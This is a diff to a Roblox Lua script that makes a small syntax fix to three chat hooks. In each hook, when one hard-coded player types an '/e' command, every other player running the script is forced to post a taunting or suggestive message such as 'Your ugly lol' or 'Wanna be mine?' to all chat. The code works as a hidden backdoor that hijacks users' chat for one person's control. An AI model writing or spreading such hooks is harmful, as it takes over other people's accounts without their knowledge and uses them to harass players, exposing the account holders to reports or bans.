@@ -107,7 +107,7 @@ end)
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match("/e ugly .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
-			wait(0) local A_1 = "Your ugly lol" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) \
+			wait(0) local A_1 = "Your ugly lol" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
 
 		end
 	end
@@ -116,7 +116,7 @@ end)
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match("/e goofy .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
-			wait(0) local A_1 = "Goofy ahh kid" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) \
+			wait(0) local A_1 = "Goofy ahh kid" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
 
 		end
 	end
@@ -125,7 +125,7 @@ end)
 user_premium__001.Chatted:connect(function(cht)
 	if cht:match("/e sus .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
-			wait(0) local A_1 = "Wanna be mine?" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) \
+			wait(0) local A_1 = "Wanna be mine?" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
 
 		end
 	end
